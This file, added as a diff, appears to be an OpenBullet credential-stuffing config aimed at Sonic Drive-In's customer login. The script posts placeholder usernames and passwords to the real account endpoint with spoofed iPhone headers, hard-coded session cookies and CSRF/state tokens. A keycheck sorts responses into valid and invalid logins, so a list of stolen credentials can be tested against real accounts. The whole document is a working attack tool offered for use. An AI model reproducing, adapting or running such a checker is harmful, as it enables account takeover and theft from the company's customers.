@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "SONIC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-12T19:00:07.9643702-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://account.sonicdrivein.com/usernamepassword/login" 
+  CONTENT "{\"client_id\":\"ieDfRRO50H62kizB6qKOQyOqKG1nQxCE\",\"redirect_uri\":\"com.sonic.sonicdrivein://account.sonicdrivein.com/ios/com.sonic.sonicdrivein/callback\",\"tenant\":\"sonicdrivein\",\"response_type\":\"code\",\"scope\":\"openid offline_access\",\"audience\":\"https://api.sonicdrivein.digital/mobile-bff-prod\",\"_csrf\":\"4i8u0E7K-ApDHufVJF9Py0S0Erf4ZdZMX5jQ\",\"state\":\"g6Fo2SAzSDZ4cTE0WTNHMGtOWXZLaGsyQzFMNmxoU2RwN3BpdaN0aWTZIHowRnhNby1HTWFfcENyalUyWTRIMXlGUVpsSEpfWmFno2NpZNkgaWVEZlJSTzUwSDYya2l6QjZxS09ReU9xS0cxblF4Q0U\",\"_intstate\":\"deprecated\",\"password\":\"<PASS>\",\"connection\":\"dapi-connection\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: account.sonicdrivein.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://account.sonicdrivein.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://account.sonicdrivein.com/login?state=g6Fo2SAzSDZ4cTE0WTNHMGtOWXZLaGsyQzFMNmxoU2RwN3BpdaN0aWTZIHowRnhNby1HTWFfcENyalUyWTRIMXlGUVpsSEpfWmFno2NpZNkgaWVEZlJSTzUwSDYya2l6QjZxS09ReU9xS0cxblF4Q0U&client=ieDfRRO50H62kizB6qKOQyOqKG1nQxCE&protocol=oauth2&prompt=login&code_challenge=cFZdfsyX5e46xLro47gpUc7L333ps9FFeGmtQJrlHzo&flow=signup&scope=openid%20offline_access&redirect_uri=com.sonic.sonicdrivein%3A%2F%2Faccount.sonicdrivein.com%2Fios%2Fcom.sonic.sonicdrivein%2Fcallback&audience=https%3A%2F%2Fapi.sonicdrivein.digital%2Fmobile-bff-prod&response_type=code&connection=dapi-connection&code_challenge_method=S256&auth0Client=eyJuYW1lIjoiQXV0aDAuc3dpZnQiLCJ2ZXJzaW9uIjoiMS4xOS4wIiwiZW52Ijp7InN3aWZ0IjoiNS54IiwiaU9TIjoiMTMuNCJ9fQ" 
+  HEADER "Auth0-Client: eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS42LjEifQ==" 
+  HEADER "Content-Length: 618" 
+  HEADER "Cookie: _csrf=64DE-eZmDmvFMFiU3liUQiTz; auth0=s%3AyJfStmdcbdNuc2tcwXxaG7pCTtDFFRJ5.5RbQIts%2BxDAWJ79CCN9pjTvdBaWToq%2FQ3JUm0wC9TIc; auth0_compat=s%3AyJfStmdcbdNuc2tcwXxaG7pCTtDFFRJ5.5RbQIts%2BxDAWJ79CCN9pjTvdBaWToq%2FQ3JUm0wC9TIc; did=s%3Av0%3A84ed9ba0-6b0e-11ea-9d99-6313e4b7ad52.A20r2Zy3P0vlZUR4m4SzYi5XNWyaBHmOp%2Bn%2FLlWJfd0; did_compat=s%3Av0%3A84ed9ba0-6b0e-11ea-9d99-6313e4b7ad52.A20r2Zy3P0vlZUR4m4SzYi5XNWyaBHmOp%2Bn%2FLlWJfd0" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "wresult" 
+  KEYCHAIN Failure OR 
+    KEY "invalid_user_password" 
+
